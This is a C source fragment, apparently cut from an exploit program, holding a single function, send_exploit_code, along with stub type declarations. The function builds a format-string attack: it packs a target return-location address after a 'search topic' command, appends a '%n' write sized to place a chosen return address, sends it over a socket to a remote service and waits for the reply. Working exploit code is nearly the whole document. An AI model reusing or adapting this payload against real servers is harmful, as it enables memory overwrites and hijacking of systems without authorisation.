
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int buf ;


 scalar_t__ DF_OFFSET ;
 int memset (char*,int ,int) ;
 scalar_t__ recv (int,char*,int,int ) ;
 int send (int,char*,int,int ) ;
 int snprintf (char*,int,char*) ;
 int sprintf (char*,char*,scalar_t__,int) ;
 int strlen (char*) ;
 scalar_t__ strstr (char*,char*) ;

int send_exploit_code(int sock,unsigned long retloc,unsigned long retaddr,int sflag){
 char buf[1024];
 int i=0;

 memset((char *)buf,0,sizeof(buf));
 snprintf(buf,sizeof(buf)-1,"1 search topic x");
 i=strlen(buf);
 *(long *)&buf[i]=retloc;
 i+=4;
 if(retaddr==0){
  retaddr+=0x10000;
 }
 sprintf(buf+i,"%%%lux%%%d$n\n",retaddr-i-DF_OFFSET,sflag);

 send(sock,buf,strlen(buf),0);
 memset(buf,0,sizeof(buf));
 while(recv(sock,buf,sizeof(buf)-1,0)){
  if(strstr(buf,")")){
   break;
  }
 }
 return 0;
}
